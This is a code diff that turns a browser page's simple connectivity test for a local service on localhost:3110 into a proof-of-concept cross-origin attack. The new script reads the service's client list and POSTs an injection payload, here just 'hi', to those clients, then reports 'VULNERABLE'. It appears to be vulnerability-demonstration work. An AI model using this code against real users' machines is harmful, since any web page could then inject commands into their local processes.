@@ -1,95 +1,42 @@
-'use strict';
+// NOTE: server binds IPv6 loopback only, so use localhost (resolves to ::1), not 127.0.0.1.
+const BASE = 'http://localhost:3110';
+const PAYLOAD = 'hi';
 
-const ENDPOINT = 'http://localhost:3110/o';
-const TIMEOUT_MS = 5000;
-
-const button = document.getElementById('runButton');
-const result = document.getElementById('result');
-
-// Display the endpoint and current page origin.
-document.getElementById('endpoint').textContent = ENDPOINT;
-document.getElementById('origin').textContent = window.location.origin;
-
-function showResult(state, heading, detail) {
-  result.dataset.state = state;
-  result.replaceChildren();
-
-  const title = document.createElement('strong');
-  title.textContent = heading;
-  result.append(title);
-
-  const message = document.createElement('p');
-  message.textContent = detail;
-  result.append(message);
-}
-
-async function runTest() {
-  button.disabled = true;
-  button.textContent = 'Testing…';
-
-  showResult(
-    '',
-    'Test running',
-    'Sending a simple GET request to the local endpoint.'
-  );
-
-  const controller = new AbortController();
-
-  const timeout = setTimeout(() => {
-    controller.abort();
-  }, TIMEOUT_MS);
+async function go(){
+  const r = document.getElementById('r');
+  r.style.background = '#222';
+  r.textContent = 'Sending POST with body "hi"...';
 
   try {
-    const response = await fetch(ENDPOINT, {
-      method: 'GET',
-      mode: 'cors',
-      signal: controller.signal,
-      cache: 'no-store'
+    // 1) Read the client list cross-origin (GET, CORS * applies).
+    let clients = [];
+    try {
+      const g = await fetch(BASE + '/o', {method:'GET'});
+      clients = await g.json().catch(()=>[]);
+    } catch(_){}
+
+    // Client rows are [pid, user, ver, status, placeId]; Clients header wants STRING pids.
+    const pids = (Array.isArray(clients)?clients:[])
+      .map(c => Array.isArray(c) ? c[0] : (c.pid||c.Pid))
+      .filter(Boolean).map(String);
+
+    // 2) Cross-origin inject with the "hi" payload.
+    const res = await fetch(BASE + '/o', {
+      method:'POST',
+      headers:{
+        'Content-Type':'text/plain',
+        'Clients':JSON.stringify(pids.length?pids:["0"])
+      },
+      body: PAYLOAD
     });
 
-    let bodyPreview = '';
-
-    try {
-      const text = await response.text();
-      bodyPreview = text.slice(0, 500);
-    } catch (_) {
-      bodyPreview = 'The response body could not be read.';
-    }
-
-    if (response.ok) {
-      showResult(
-        'success',
-        `Endpoint responded: HTTP ${response.status}`,
-        'The browser was able to read the response. This confirms GET reachability from this page, but does not prove that other methods or routes are vulnerable.'
-      );
-    } else {
-      showResult(
-        'warning',
-        `Endpoint responded: HTTP ${response.status}`,
-        'The browser could read the response, but the server returned a non-success status. Check the endpoint configuration.'
-      );
-    }
-
-    if (bodyPreview) {
-      const preview = document.createElement('pre');
-
-      preview.textContent =
-        `Response preview (up to 500 characters):\n${bodyPreview}`;
-
-      result.append(preview);
-    }
-  } catch (error) {
-    const detail =
-      error.name === 'AbortError'
-        ? `The request timed out after ${TIMEOUT_MS / 1000} seconds.`
-        : 'The browser could not complete or read the request. The service may be stopped, the route may be unavailable, or CORS may have blocked access. Browser fetch errors do not reliably distinguish these causes.';
-
-    showResult('error', 'Request failed', detail);
-  } finally {
-    clearTimeout(timeout);
-    button.disabled = false;
-    button.textContent = 'Run connectivity test';
+    r.style.background = res.ok ? '#7a1020' : '#8a5a00';
+    r.innerHTML = '<b>' + (res.ok?'VULNERABLE':'reachable, HTTP '+res.status) + '</b> — ' +
+      'cross-origin request accepted (HTTP ' + res.status + ').<br>' +
+      'Clients visible to this page: <pre>' + JSON.stringify(clients,null,2) + '</pre>' +
+      'Check console/server output for the "hi" payload.';
+  } catch(e){
+    r.style.background = '#0b5';
+    r.textContent = 'Request blocked / server not reachable: ' + e;
   }
 }
-
-button.addEventListener('click', runTest);
